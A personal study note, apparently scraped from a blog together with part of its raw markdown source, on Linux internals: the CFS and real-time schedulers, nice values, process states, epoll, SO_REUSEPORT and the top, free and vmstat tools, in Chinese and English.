exceeds sched_latency_ns/sched_min_granularity_ns, the slice becomes number_of_running_tasks * sched_min_granularity_ns. Prior to that, the slice is equal to sched_latency_ns. sched_min_granularity_ns Minimal preemption granularity for CPU bound tasks. See sched_latency_ns for details. The default value is 4000000 (ns). This value also specifies the maximum amount of time during which a sleeping task is considered to be running for entitlement calculations. Increasing this variable increases the amount of time a waking task may consume before being preempted, thus increasing scheduler latency for CPU bound tasks. The default value is 6000000 (ns). Real-time scheduling Linux has soft real-time scheduling: No hard real-time guarantees All real-time processes are higher priority than any conventional processes Processes with priorities [0, 99] are real-time Process can be converted to real-time via sched_setscheduler system call First-in, first-out: SCHED_FIFO: Static priority, Process is only preempted for a higher-priority process, No time quanta; it runs until it blocks or yields voluntarily, RR within same priority level Round-robin: SCHED_RR: As above but with a time quanta Normal processes have SCHED_NORMAL scheduling policy Multiprocessor scheduling Per-CPU runqueue Possible for one processor to be idle while others have jobs waiting in their run queues Periodically, rebalance runqueues Migration threads move processes from one runque to another The kernel always locks runqueues in the same order for deadlock prevention Adjusting priority Goal: dynamically increase priority of interactive process How to determine interactive? Sleep ratio, Mostly sleeping: I/O bound, Mostly running: CPU bound misc Scheduling policies(Ref: Scheduling policies) Scheduling policies CFS implements three scheduling policies: SCHED_NORMAL (traditionally called SCHED_OTHER): The schedulingpolicy that is used for regular tasks. SCHED_BATCH: Does not preempt nearly as often as regular taskswould, thereby allowing tasks to run longer and make better use ofcaches but at the cost of interactivity. This is well suited forbatch jobs. SCHED_IDLE: This is even weaker than nice 19, but its not a trueidle timer scheduler in order to avoid to get into priorityinversion problems which would deadlock the machine. SCHED_FIFO/_RR are implemented in sched/rt.c and are as specified byPOSIX. SCHEDULING CLASSES The new CFS scheduler has been designed in such a way to introduce “SchedulingClasses,” an extensible hierarchy of scheduler modules. These modulesencapsulate scheduling policy details and are handled by the scheduler corewithout the core code assuming too much about them. sched/fair.c implements the CFS scheduler described above. sched/rt.c implements SCHED_FIFO and SCHED_RR semantics, in a simpler way thanthe previous vanilla scheduler did. It uses 100 runqueues (for all 100 RTpriority levels, instead of 140 in the previous scheduler) and it needs noexpired array. Scheduling classes are implemented through the sched_class structure, whichcontains hooks to functions that must be called whenever an interesting eventoccurs. Linux有两种不同的优先级范围 nice值：从-20到19，越大优先级越低。所有unix系统的标准化概念，但是不同unix系统的调度算法不同，所以nice值的运用方式也不同。ps -el中NI那一列就是进程对应的nice值 实时优先级：从0到99，越大优先级越高。任何实时进程的优先级都高于普通进程，也就是实时优先级跟nice值是两个不相交的范畴。ps -eo stat,uid,pid,ppid,rtprio,time,comm中，rtprio就是实时优先级，如果是-则说明不是实时进程 nice value（来自sched和nice的的manual） It affects the scheduling of SCHED_OTHER and SCHED_BATCH (see below) processes. The nice value can be modified using nice(2), setpriority(2), or sched_setattr(2). According to POSIX.1, the nice value is a per-process attribute; that is, the threads in a process should share a nice value. However, on Linux, the nice value is a per-thread attribute: different threads in the same process may have different nice values. The range of the nice value varies across UNIX systems. On modern Linux, the range is -20 (high priority) to +19 (low priority). On some other systems, the range is -20..20. Very early Linux kernels (Before Linux 2.0) had the range -infinity..15. The degree to which the nice value affects the relative scheduling of SCHED_OTHER processes likewise varies across UNIX systems and across Linux kernel versions. With the advent of the CFS scheduler in kernel 2.6.23, Linux adopted an algorithm that causes relative differences in nice values to have a much stronger effect. In the current implementation, each unit of difference in the nice values of two processes results in a factor of 1.25 in the degree to which the scheduler favors the higher priority process. This causes very low nice values (+19) to truly provide little CPU to a process whenever there is any other higher priority load on the system, and makes high nice values (-20) deliver most of the CPU to applications that require it (e.g., some audio applications). On Linux, the RLIMIT_NICE resource limit can be used to define a limit to which an unprivileged process’s nice value can be raised; see setrlimit(2) for details. Traditionally, only a privileged process could lower the nice value (i.e., set a higher priority). However, since Linux 2.6.12, an unprivileged process can decrease the nice value of a target process that has a suitable RLIMIT_NICE soft limit; see getrlimit(2) for details. 进程状态 来自linux内核设计与实现 TASK_RUNNING：进程是可执行的，可能正在执行，或在运行队列中等待执行。这是进程在用户空间中执行的唯一可能状态。内核空间中正在执行的进程也是这种状态 TASK_INTERRUPTIBLE：进程正在睡眠（也就是被阻塞），到达某些条件达成，一旦条件达成，内核就会把进程状态设置为RUNNING。处于此状态的进程会因为接收到信号而提前被唤醒并随时准备投入运行 TASK_UNINTERRUPTIBLE：与TASK_INTERRUPTIBLE的差别在于，就算接受到信号也不会被唤醒或准备投入运行。通常在进程必须在等待时不受干扰或等待的事件很快就会发生时出现（比如这个任务正在进行重要的操作，甚至可能持有一个信号量）。因为不对信号做响应，所以较之可中断的状态，用的较少。（ps中看到的D状态的进程就是这种状态） __TASK_TRACED：被其他进程跟踪的进程，比如通过ptrace对调试程序进行跟踪 __TASK_STOPPED：进程停止执行，没有投入运行也不能投入运行。发生在接受到SIGSTOP，SIGTSTP，SIGTTIN，SIGTTOU信号时，调试期间受到任何信号也会使得进程进入这状态 转换图见书P24(41) Ref: ps manual 12345678910the state of a process: D uninterruptible sleep (usually IO) I Idle kernel thread R running or runnable (on run queue) S interruptible sleep (waiting for an event to complete) T stopped by job control signal t stopped by debugger during the tracing W paging (not valid since the 2.6.xx kernel) X dead (should never be seen) Z defunct (&quot;zombie&quot;) process, terminated but not reaped by its parent 僵尸进程、孤儿进程 子进程的父进程终止后，成为孤儿进程，init（pid为1，所有进程的祖先）会接管孤儿进程，所以判断父进程是否终止的方法可以是检查getppid是否返回1（前提是这个子进程原本的父进程不是init） 系统允许父进程在子进程终止后还去执行wait，以确定子进程是如何终止的。这是通过把子进程转为僵尸进程来处理的，僵尸进程释放了该该进程持有的大部分资源，唯一保留的是内核中的进程表中的一条记录（包含pid、终止状态、资源使用数据等）。僵尸进程无法被SIGKILL杀死（SIGKILL、SIGSTOP信号无法被捕获和忽略） 父进程调用wait之后，内核将删除僵尸进程，如果父进程没有执行wait就退出，init将接管子进程并自动调用wait 如果父进程没有退出，而又没有wait子进程，那么就可能导致僵尸进程填满内核进程表，从而阻碍新进程的创建。将他们移除的唯一方法是：杀死父进程（或是等待父进程终止）从而init会wait 父进程wait的方式 父进程不带WNOHANG标志调用wait 父进程带有WNOHANG标志轮询 为SIGCHILD建立handler（默认是忽略）。需要在handler内部带WNOHANG不断调用wait以避免两个问题：调用信号Handler时，会阻塞引发该handler的信号；同一个信号不排队 应该在创建任何子进程之前就设置好Handler，因为在设置Handler时，如果已有子进程终止，那么有的系统会立刻产生SIGCHILD信号，有的不会 MISC 识别僵尸进程ps -ef | grep &quot;defunct&quot; SO_REUSEPORT 引用自 The new socket option allows multiple sockets on the same host to bind to the same port, and is intended to improve the performance of multithreaded network server applications running on top of multicore systems. So long as the first server sets this option before binding its socket, then any number of other servers can also bind to the same port if they also set the option beforehand The requirement that the first server must specify this option prevents port hijacking—the possibility that a rogue application binds to a port already used by an existing server in order to capture (some of) its incoming connections or datagrams. To prevent unwanted processes from hijacking a port that has already been bound by a server using SO_REUSEPORT, all of the servers that later bind to that port must have an effective user ID that matches the effective user ID used to perform the first bind on the socket. The second of the traditional approaches used by multithreaded servers operating on a single port is to have all of the threads (or processes) perform an accept() call on a single listening socket in a simple event loop of the form:12345&gt; while (1) &#123;&gt; new_fd = accept(...);&gt; process_connection(new_fd);&gt; &#125;&gt; The problem with this technique, as Tom pointed out, is that when multiple threads are waiting in the accept() call, wake-ups are not fair, so that, under high load, incoming connections may be distributed across threads in a very unbalanced fashion the SO_REUSEPORT implementation distributes connections evenly across all of the threads (or processes) that are blocked in accept() on the same port. SO_REUSEPORT can be used with both TCP and UDP sockets. Tom noted that the traditional SO_REUSEADDR socket option already allows multiple UDP sockets to be bound to, and accept datagrams on, the same UDP port. However, by contrast with SO_REUSEPORT, SO_REUSEADDR does not prevent port hijacking and does not distribute datagrams evenly across the receiving threads. PTHREAD_STACK_MIN Ref: Setting the Stack Size The size attribute defines the size of the stack (in bytes) that the system allocates. The size should not be less than the system-defined minimum stack size. See About Stacks for more information. size contains the number of bytes for the stack that the new thread uses. If size is zero, a default size is used. In most cases, a zero value works best.-PTHREAD_STACK_MIN is the amount of stack space that is required to start a thread. This stack space does not take into consideration the threads routine requirements that are needed to execute application code. IO 慢速syscall被信号中断时，已经read、write部分数据的syscall的处理：POSIX2001版是规定为成功返回，返回已read、write的字节数 POSIX.1要求只有中断信号的SA_RESTART标志有效时，才重启。不同厂商的处理方式不同 网络编程 因特网的socket地址存放在sockaddr_in的struct中 connect、bind、accept函数需要接受各种类型的socket地址结构（不仅仅是因特网socket），所以其要求大家都强转成socketaddr给他 socket函数才能一个socketFD，可以硬编码socket(AF_INET, SOCK_STREAM, 0)，其返回的fd仅仅是部分打开，还不能用于读写 客户端使用connect函数来完成三次握手 socket()：返回一个socketFd，这是一个主动套接字 bind() 把一个本地协议地址赋予一个socket，对于ip协议，就是32bit的ipv4地址或128bit的ipv6地址与16bit的tcp或udp端口号的组合 调用bind时，可以指定一个端口号和（或）一个ip地址，也可以都不指定 listen()：把socket()创建的主动套接字转为监听套接字 epoll epoll支持水平触发和边缘触发 水平触发：能在FD上以非阻塞的方式执行I/O操作（poll、select提供的也是这个） 边缘触发 自从上一次调用epoll_wait后FD上是否已经有I/O活动（或者是FD被打开，如果之前没有调用的话），语义上类似信号驱动I/O，如果有多个I/O事件发生，epoll会把他们合并成一次单独的通知（信号驱动上可能会产生多个信号） 可以减少syscall的次数（我猜？） 程序基本框架如下 所有待监视的FD都设置为非阻塞 通过epoll_ctl建立epoll interest list 使用如下循环处理IO事件 用epoll_wait取得ready的FD list 针对每一个处于ready的FD，不断调用IO syscall，直到返回EAGAIN或EWOULDBLOCK 解决饥饿的方法 应用程序自己维护一个list，该list存储到目前为止的所有ready FD（如果某个FD返回EAGAIN或EWOULDBLOCK，则移出去） 每次都调用epoll_wait去监视并添加ready FD到list中。如果list中已经有FD，则这次监视的timeout（应该指的是epoll_wait的timeout参数）应该为0或较小的正数。这样子就不用在epoll_wait上花太多时间，可以进行IO 对于list上的FD，可以使用round-robin方式去循环处理，而不是每次从epoll_wait返回后都从list头开始处理 相对之下，使用水平触发时，因为我们只是在ready 的FD上做一些IO而已（不是循环到不能读为止），所以不会有饥饿问题。（英文原文说的是blocking 的FD，译文说的是非阻塞，我觉得也是非阻塞比较合适，因为如果阻塞那么一旦没东西读了，会不会阻塞在那里呢？还是说只要读了一点东西，然后接下来不能读，就立刻可以返回） 核心数据结构称为epoll实例，与epoll_fd关联，是内核数据结构的句柄。这些内核数据结构实现了两个目的 interest list ready list（前者的子集） epoll_create：创建epoll实例，size参数已废弃。epoll_create1去掉了该参数并且可设置flags，目前只支持EPOLL_CLOEXEC close-on-execwhich causes the file descriptor to be automatically (and atomically) closed when any of the exec-family functions succeed.This is useful to keep from leaking your file descriptors to random programs run by e.g. system(). epoll_ctl fd参数（第三个参数）可以是pipe、FIFO、socket、POSIX消息队列、inotify实例、终端、设备、另一个epoll实例的fd（可以用于建立层次关系），不能是普通文件或目录的FD（EPERM） In a multithreaded program, it is possible for one thread to use epoll_ctl to add file descriptors to the interest list of an epoll instance that is already being monitored by epoll_wait() in another thread. These changes to the interest list will be taken into account immediately, and the epoll_wait() call will return readiness information about the newly added file descriptors. EPOLLONESHOT：在下一次epoll_wait返回该FD后，该FD在兴趣列表中被标记为非激活状态，可以用EPOLL_CTL_MOD重新激活 max_user_watcher：每个注册到epoll实例上的FD都会占用一小段不能被交换的内核内存空间。这个参数用于定义可以注册到epoll实例上的FD总数。/proc/sys/fs/epoll/max_user_watches epoll_wait 返回后，需要检查EINTR，如果在执行期间被一个信号打断，然后又通过SIGCONT信号恢复，就可能出现这个错误 EPOLLHUP Note that when reading from a channel such as a pipe or a stream socket, this event merely indicates that the peer closed its end of the channel. Subsequent reads from the channel will return 0 (end of file) only after all outstanding data in the channel has been consumed. 1234567&gt; if(evlist[j].events &amp; EPOLLIN) &#123;&gt; // do read&gt; &#125;else if(evlist[j].events &amp; (EPOLLHUP | EPOLLERR)) &#123;&gt; // close fd &gt; &#125;&gt; // After the epoll_wait(), EPOLLIN and EPOLLHUP may both have been set. But we'll only get here, and thus close the file descriptor, if EPOLLIN was not set. This ensures that all outstanding input (possibly more than MAX_BUF bytes) is consumed (by further loop iterations) before the file descriptor is closed.&gt; EPOLLHUP和EPOLLERR会出现在FIFO对端关闭或终端挂起时出现 epoll的语义 创建epoll实例时，内核在内存中创建一个新的i-node并打开文件描述（file descriptor：一个打开的文件的上下文信息，内核的数据结构） 随后在调用进程中为打开的这个文件描述分配一个新的文件描述符（这就是用户空间的应用程序操作这个file descriptor的句柄） 同epoll实例的insterest list相关联的是打开的文件描述，而不是文件描述符。所以可以使用dup复制该描述符，fork也可以，因为子进程复制了父进程的epoll描述符。复制后的描述符指向相同的文件描述 如果一个文件描述是epoll insterest list的成员，那么在这个文件描述的所有描述符都关闭后，这个文件描述会自动从epoll 的interest list中移除 所以如果某个fd A被复制（复制的那一个叫fd B），然后关闭该fd A，但是epoll_wait还是会在该文件描述就绪后返回fd A epoll vs select vs poll 每次调用select、poll，内核必须检查所有在调用中指定的FD。epoll只需要在FD就绪时将其加入ready list，然后epoll_wait去fetch这些FD就行 调用select、poll时，我们传递一个标记了所有待监视的FD的数据结构给内核，返回时，内核将所有标记为ready的FD的数据结构在传给我们。epoll则使用epoll_ctl在内核空间建立数据结构，之后的epoll_wait不需要传递数据结构，返回的也只是ready的FD epoll的性能会随着发生I/O事件的数量而线性变化，所以适用于需要监视大量FD但是大部分处于空闲状态 epoll与信号 epoll_wait的过程中是会因为SIGINT而返回，errno为EINTR的 如果使用了信号，应该使用epoll_pwait来避免race condition 值得一提的时，epoll的效率在某些情况下比select或者poll要低，这个是曾经做过测试的。具体的业务场景就是：几乎所有连接都处于活跃状态，并且有频繁的业务数据发送和接受，这个时候select或者poll的能力要强于epoll。下面贴一张比较久远的测试数据表格，可以看到这个现象。一个用select实现的echo server，传输的数据量是52B一次的小报文。 (Ref) select |连接数量|cpu(%)|一次回射平均延时(μs)| |:-:|:-:|:-:| |100|94.5|1394| |500|95|9507| |1000|95|19852| epoll |连接数量|cpu(%)|一次回射平均延时(μs)| |:-:|:-:|:-:| |100|93|1930| |500|93|11120| |1000|95|23857| (或许是因为使用了中断，所以不如轮询快？另外，select是数组，epoll应该是链表（？）所以cache miss高？不过听说kqueue可以合并中断，还可以把中断改成轮询) 原理其它答案讲得差不多了，我就补一句，从kernel层面将，事件产生有可能不是由硬件中断触发的，在一定情况下kernel的确会轮询，因为响应硬件中断是一个成本比较高的操作。以网卡为例，当数据量很少的时候，每来一个数据包网卡都回产生一个中断，kernel响应这个中断，从网卡缓冲区中读出数据放进协议栈处理，当满足一定条件时，kernel回调用户代码，这里的“回调”一般情况下是指从一个kernel syscall中返回(在此之前用户代码一直处于block状态)。当数据量很大时，每个包都产生一个中断就划不来了，此时kernel可以启动interrupt coalescing机制，让网卡做中断合并，也就是说来足够多的数据包或者等待一个timeout才会产生一个中断，kernel在响应中断时会把所有数据一起读出来处理，这样可以有效的降低中断次数。当数据量更大时，网卡缓冲区里几乎总是有未处理的数据，此时kernel干脆会禁掉网卡的中断，切换到轮询处理的模式，说白了就是跑一个忙循环不停地读网卡缓冲区里的数据，这样综合开销更低。作者：徐辰链接：https://www.zhihu.com/question/20122137/answer/54153089来源：知乎著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。 惊群 很多个进程都block在server socket的accept()，一但有客户端进来，所有进程的accept()都会返回，但是只有一个进程会读到数据，就是惊群。实际上现在的Linux内核实现中不会出现惊群了，只会有一个进程被唤醒（Linux2.6内核）(ref) 为了确保只有一个进程（线程）得到资源，需要对资源操作进行加锁保护，加大了系统的开销。目前一些常见的服务器软件有的是通过锁机制解决的，比如 Nginx 什么是惊群，如何有效避免惊群? - 滴滴云的回答 - 知乎 命令top Ref。影响load average值大小的直接因素是系统中活动的进程数。Linux的系统负载指运行队列的平均长度，也就是等待CPU的平均进程数。活动的进程数可以很直观表明系统负载情况。值越大，表明CPU上正在运行和待运行的进程数越多，也就是负载越大。查看loadAvg的方法：top、uptime、w、cat /proc/loadavg，是一分钟、五分钟、十五分钟 top的manual 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273 2b. TASK and CPU States This portion consists of a minimum of two lines. In an SMP environ‐ ment, additional lines can reflect individual CPU state percentages. Line 1 shows total tasks or threads, depending on the state of the Threads-mode toggle. That total is further classified as: running; sleeping; stopped; zombie Line 2 shows CPU state percentages based on the interval since the last refresh. As a default, percentages for these individual categories are dis‐ played. Where two labels are shown below, those for more recent ker‐ nel versions are shown first. us, user : time running un-niced user processes sy, system : time running kernel processes ni, nice : time running niced user processes id, idle : time spent in the kernel idle handler wa, IO-wait : time waiting for I/O completion hi : time spent servicing hardware interrupts si : time spent servicing software interrupts st : time stolen from this vm by the hypervisor In the alternate cpu states display modes, beyond the first tasks/threads line, an abbreviated summary is shown consisting of these elements（就是按了`t`键之后显示的内容）: a b c d %Cpu(s): 75.0/25.0 100[ ... Where: a) is the combined us and ni percentage; b) is the sy percent‐ age; c) is the total; and d) is one of two visual graphs of those rep‐ resentations. See topic 4b. SUMMARY AREA Commands and the `t&apos; command for additional information on that special 4-way toggle.2c. MEMORY Usage This portion consists of two lines which may express values in kibibytes (KiB) through exbibytes (EiB) depending on the scaling fac‐ tor enforced with the `E&apos; interactive command. As a default, Line 1 reflects physical memory, classified as: total, free, used and buff/cache Line 2 reflects mostly virtual memory, classified as: total, free, used and avail (which is physical memory) The avail number on line 2 is an estimation of physical memory avail‐ able for starting new applications, without swapping. Unlike the free field, it attempts to account for readily reclaimable page cache and memory slabs. It is available on kernels 3.14, emulated on kernels 2.6.27+, otherwise the same as free. In the alternate memory display modes, two abbreviated summary lines are shown consisting of these elements: a b c GiB Mem : 18.7/15.738 [ ... GiB Swap: 0.0/7.999 [ ... Where: a) is the percentage used; b) is the total available; and c) is one of two visual graphs of those representations. In the case of physical memory, the percentage represents the total minus the estimated avail noted above. The `Mem&apos; graph itself is divided between used and any remaining memory not otherwise accounted for by avail. See topic 4b. SUMMARY AREA Commands and the `m&apos; command for additional information on that special 4-way toggle. This table may help in interpreting the scaled values displayed: KiB = kibibyte = 1024 bytes MiB = mebibyte = 1024 KiB = 1,048,576 bytes GiB = gibibyte = 1024 MiB = 1,073,741,824 bytes TiB = tebibyte = 1024 GiB = 1,099,511,627,776 bytes PiB = pebibyte = 1024 TiB = 1,125,899,906,842,624 bytes EiB = exbibyte = 1024 PiB = 1,152,921,504,606,846,976 bytes free 123456789101112131415161718192021222324252627282930free displays the total amount of free and used physical and swap memoryin the system, as well as the buffers and caches used by the kernel. Theinformation is gathered by parsing /proc/meminfo. The displayed columnsare:total Total installed memory (MemTotal and SwapTotal in /proc/meminfo)used Used memory (calculated as total - free - buffers - cache)free Unused memory (MemFree and SwapFree in /proc/meminfo)shared Memory used (mostly) by tmpfs (Shmem in /proc/meminfo)buffers Memory used by kernel buffers (Buffers in /proc/meminfo)cache Memory used by the page cache and slabs (Cached and SReclaimable in /proc/meminfo)buff/cache Sum of buffers and cacheavailable Estimation of how much memory is available for starting new appli‐ cations, without swapping. Unlike the data provided by the cache or free fields, this field takes into account page cache and also that not all reclaimable memory slabs will be reclaimed due to items being in use (MemAvailable in /proc/meminfo, available on kernels 3.14, emulated on kernels 2.6.27+, otherwise the same as free) Buffers vs Cached(Ref, Ref) Buffers: Memory in buffer cache, so relatively temporary storage for raw disk blocks. This shouldn’t get very large. Cached: Memory in the pagecache (Diskcache and Shared Memory)12345678 Buffers: Relatively temporary storage for raw disk blocks shouldn&apos;t get tremendously large (20MB or so) Cached: in-memory cache for files read from the disk (the pagecache). Doesn&apos;t include SwapCachedSwapCached: Memory that once was swapped out, is swapped back in but still also is in the swapfile (if memory is needed it doesn&apos;t need to be swapped out AGAIN because it is already in the swapfile. This saves I/O) vmstat 1234567891011121314151617181920212223242526272829303132FIELD DESCRIPTION FOR VM MODE Procs r: The number of runnable processes (running or waiting for run time). b: The number of processes in uninterruptible sleep. Memory swpd: the amount of virtual memory used. free: the amount of idle memory. buff: the amount of memory used as buffers. cache: the amount of memory used as cache. inact: the amount of inactive memory. (-a option) active: the amount of active memory. (-a option) Swap si: Amount of memory swapped in from disk (/s). so: Amount of memory swapped to disk (/s). IO bi: Blocks received from a block device (blocks/s). bo: Blocks sent to a block device (blocks/s). System in: The number of interrupts per second, including the clock. cs: The number of context switches per second. CPU These are percentages of total CPU time. us: Time spent running non-kernel code. (user time, including nice time) sy: Time spent running kernel code. (system time) id: Time spent idle. Prior to Linux 2.5.41, this includes IO-wait time. wa: Time spent waiting for IO. Prior to Linux 2.5.41, included in idle. st: Time stolen from a virtual machine. Prior to Linux 2.6.11, unknown. buff vs cache tldp-buffer-cache By reading the information from disk only once and then keeping it in memory until no longer needed, one can speed up all but the first read. This is called disk buffering, and the memory used for the purpose is called the buffer cache. To make the most efficient use of real memory, Linux automatically uses all free RAM for buffer cache, but also automatically makes the cache smaller when programs need more memory. Under Linux, you do not need to do anything to make use of the cache, it HugePage 好处 增加TLB命中率 减小页表大小 如果可以把多级页表的级数减少，则可以减小查页表时间 缺点 有一些需要页对齐的场景那么为了对齐浪费的空间就比较多 页表提供的内存保护是以页为单位的 缺页时需要调入的东西增加 共享内存时需要共享整数个页那么大的块（我认为如此，因为是通过在页表中填入相同的物理页地址来共享内存的） Cache的命中率可能会降低，比如如果有的东西需要放在相邻的两个页上，那么4K页时，其实两个东西都可以缓存在L1，但是对于4M的页则不行 12345Model name: Intel(R) Core(TM) i7-8550U CPU @ 1.80GHzL1d cache: 32KL1i cache: 32KL2 cache: 256KL3 cache: 8192K 因为程序所占用的物理内存都需要在页表有记录，那么hugePage意味着小应用会占用更多内存 mmap on Linux, the mapping will be created at a nearby page boundary.offset must be a multiple of the page size as returned by sysconf(_SC_PAGE_SIZE). 其他影响 块（文件系统的一种抽象，文件系统的最小寻址单元，只能基于块来访问文件系统）不能比page大（This is an artificial constraint that could go away in the future），所以hugepage会使得块可以很大 malloc 调用并分配1GB的内存，是否物理内存就会少1G？一方面，CopyOnWrite，所以如果没有写，是不会的。另一方面，空闲链表 MISC 需要对目录有x权限才能cd进目录","raw":"---\ntitle: My Linux Note\ndate: 2019-05-01 10:22:59\ntags:\n- Linux\n- CFS\n- epoll\ncategories:\n- Linux\n---\n\n### Linux调度\n\n- linux内核设计与实现第4章\n- 不同进程有不同的调度算法（这种模块化结构称为调度器类）。每个调度器都有一个优先级，不同调度器之间如何协调？拥有一个可执行进程的最高优先级的调度器会胜出，去选择接下来要执行那个进程（The highest priority scheduler class that has a runnable process wins, selecting who runs next.）\n\n#### CFS\n\n- 从Linux2.6.23开始引入\n- 针对普通进程的调度器类（Linux中称为`SCHED_NORMAL`，POSIX称为`SCHED_OTHER`）\n- 基于一个简单的理念：每个进程都能获得`1/n`的处理器时间（n是可运行的进程数量），任何可测量的周期内都是`1/n`（一个先运行5ms，另一个运行5ms是不满足这个理念的，要做到好像他们在10ms内同时运行，各自使用了一半的处理器能力）\n> - Ref: [https://www.cs.columbia.edu/~junfeng/13fa-w4118/lectures/l13-adv-sched.pdf](https://www.cs.columbia.edu/~junfeng/13fa-w4118/lectures/l13-adv-sched.pdf)\n> - Approximate fair scheduling. Run each process once per schedule latency period(就是sched_latency_ns，用`sysctl -a`可以看到). Time slice for process Pi: `T * Wi/(Sum of all Wi)`\n> - Too many processes? Lower bound on smallest time slice. Schedule latency = lower bound * number of procs\n> - Pick proc with weighted minimum runtime so far  `Virtual runtime: task->vruntime += executed time / Wi`\n> - Red-black tree, Balanced binary search tree, Ordered by vruntime as key, O(lgN) insertion, deletion, update, O(1): find min(`min_vruntime` caches smallest value)\n> - Update `vruntime` and `min_vruntime`: When task is added or removed, On every timer tick, context switch\n> - Converting nice level to weight(): `static const int prio_to_weight[40] (sched.h)`, Nice level changes by 1->10% weight.(Pre-computed to avoid Floating point operations, Runtime overhead)(**In the current implementation, each unit of difference in the nice values of two processes results in a factor of 1.25 in the degree to which the scheduler favors the higher priority process.**, 来自sched和nice的的manual)\n>   ```c\n>   // from https://elixir.bootlin.com/linux/v3.4/source/kernel/sched/sched.h#L804\n>   /*\n>    * Nice levels are multiplicative, with a gentle 10% change for every\n>    * nice level changed. I.e. when a CPU-bound task goes from nice 0 to\n>    * nice 1, it will get ~10% less CPU time than another CPU-bound task\n>    * that remained on nice 0.\n>    *\n>    * The \"10% effect\" is relative and cumulative: from _any_ nice level,\n>    * if you go up 1 level, it's -10% CPU usage, if you go down 1 level\n>    * it's +10% CPU usage. (to achieve that we use a multiplier of 1.25.\n>    * If a task goes up by ~10% and another task goes down by ~10% then\n>    * the relative distance between them is ~25%.)\n>    */\n>   static const int prio_to_weight[40] = {\n>    /* -20 */     88761,     71755,     56483,     46273,     36291,\n>    /* -15 */     29154,     23254,     18705,     14949,     11916,\n>    /* -10 */      9548,      7620,      6100,      4904,      3906,\n>    /*  -5 */      3121,      2501,      1991,      1586,      1277,\n>    /*   0 */      1024,       820,       655,       526,       423,\n>    /*   5 */       335,       272,       215,       172,       137,\n>    /*  10 */       110,        87,        70,        56,        45,\n>    /*  15 */        36,        29,        23,        18,        15,\n>   };\n>   ```\n> - Hierarchical, modular scheduler\n>    ```c\n>    class = sched_class_highest;\n>    for (;;) {\n>        p = class->pick_next_task(rq);\n>        if (p)\n>            return p;\n>       /*\n>        * Will never be NULL as the idle class always\n>        * returns a non-NULL p:\n>        */\n>        class = class->next;\n>    }\n>    ```\n\n\n> Ref: [SUSE-doc-Tuning the Task Scheduler](https://doc.opensuse.org/documentation/leap/tuning/html/book.sle.tuning/cha.tuning.taskscheduler.html)\n> \n> sched_latency_ns\n> Targeted preemption latency for CPU bound tasks. Increasing this variable increases a CPU bound task's timeslice. A task's timeslice is its weighted fair share of the scheduling period:\n> \n> timeslice = scheduling period * (task's weight/total weight of tasks in the run queue)\n> \n> The task's weight depends on the task's nice level and the scheduling policy. Minimum task weight for a SCHED_OTHER task is 15, corresponding to nice 19. The maximum task weight is 88761, corresponding to nice -20.\n> \n> Timeslices become smaller as the load increases. When the number of runnable tasks exceeds sched_latency_ns/sched_min_granularity_ns, the slice becomes number_of_running_tasks * sched_min_granularity_ns. Prior to that, the slice is equal to sched_latency_ns.\n> > sched_min_granularity_ns\n> >\n> > Minimal preemption granularity for CPU bound tasks. See sched_latency_ns for details. The default value is 4000000 (ns).\n> \n> This value also specifies the maximum amount of time during which a sleeping task is considered to be running for entitlement calculations. Increasing this variable increases the amount of time a waking task may consume before being preempted, thus increasing scheduler latency for CPU bound tasks. The default value is 6000000 (ns).\n\n#### Real-time scheduling\n\n> - Linux has soft real-time scheduling: No hard real-time guarantees\n> - All real-time processes are higher priority than any conventional processes\n> - Processes with priorities [0, 99] are real-time\n> - Process can be converted to real-time via sched_setscheduler system call \n> - First-in, first-out: SCHED_FIFO: Static priority, Process is only preempted for a higher-priority process, No time quanta; it runs until it blocks or yields voluntarily, RR within same priority level\n> - Round-robin: SCHED_RR: As above but with a time quanta\n> - Normal processes have SCHED_NORMAL scheduling policy\n\n#### Multiprocessor scheduling\n\n> - Per-CPU runqueue\n> - Possible for one processor to be idle while others have jobs waiting in their run queues\n> - Periodically, rebalance runqueues\n> - Migration threads move processes from one runque to another\n> - The kernel always locks runqueues in the same order for deadlock prevention\n\n#### Adjusting priority\n\n> - Goal: dynamically increase priority of interactive process\n> - How to determine interactive? Sleep ratio, Mostly sleeping: I/O bound, Mostly running: CPU bound\n\n#### misc\n- Scheduling policies(Ref: [Scheduling policies](https://www.kernel.org/doc/Documentation/scheduler/sched-design-CFS.txt))\n   > 5. Scheduling policies\n   > \n   > CFS implements three scheduling policies:\n   > \n   >   - SCHED_NORMAL (traditionally called SCHED_OTHER): The scheduling\n   >     policy that is used for regular tasks.\n   > \n   >   - SCHED_BATCH: Does not preempt nearly as often as regular tasks\n   >     would, thereby allowing tasks to run longer and make better use of\n   >     caches but at the cost of interactivity. This is well suited for\n   >     batch jobs.\n   > \n   >   - SCHED_IDLE: This is even weaker than nice 19, but its not a true\n   >     idle timer scheduler in order to avoid to get into priority\n   >     inversion problems which would deadlock the machine.\n   > \n   > SCHED_FIFO/_RR are implemented in sched/rt.c and are as specified by\n   > POSIX.\n- SCHEDULING CLASSES\n   > The new CFS scheduler has been designed in such a way to introduce \"Scheduling\n   > Classes,\" an extensible hierarchy of scheduler modules.  These modules\n   > encapsulate scheduling policy details and are handled by the scheduler core\n   > without the core code assuming too much about them.\n   > \n   > sched/fair.c implements the CFS scheduler described above.\n   > \n   > sched/rt.c implements SCHED_FIFO and SCHED_RR semantics, in a simpler way than\n   > the previous vanilla scheduler did.  It uses 100 runqueues (for all 100 RT\n   > priority levels, instead of 140 in the previous scheduler) and it needs no\n   > expired array.\n   > \n   > Scheduling classes are implemented through the sched_class structure, which\n   > contains hooks to functions that must be called whenever an interesting event\n   > occurs.\n   > \n\n- Linux有两种不同的优先级范围\n   - nice值：从-20到19，越大优先级越低。所有unix系统的标准化概念，但是不同unix系统的调度算法不同，所以nice值的运用方式也不同。`ps -el`中`NI`那一列就是进程对应的nice值\n   - 实时优先级：从0到99，越大优先级越高。任何实时进程的优先级都高于普通进程，也就是实时优先级跟nice值是两个不相交的范畴。`ps -eo stat,uid,pid,ppid,rtprio,time,comm`中，`rtprio`就是实时优先级，如果是`-`则说明不是实时进程\n- nice value（来自sched和nice的的manual）\n   > - **It affects the scheduling of SCHED_OTHER and SCHED_BATCH (see below) processes.** \n   > - The nice value can be modified using nice(2), setpriority(2), or sched_setattr(2). \n   > - **According to POSIX.1, the nice value is a per-process attribute**; that is, the threads in a process should share a nice value. However, **on Linux, the nice value is a per-thread attribute**: different threads in the same 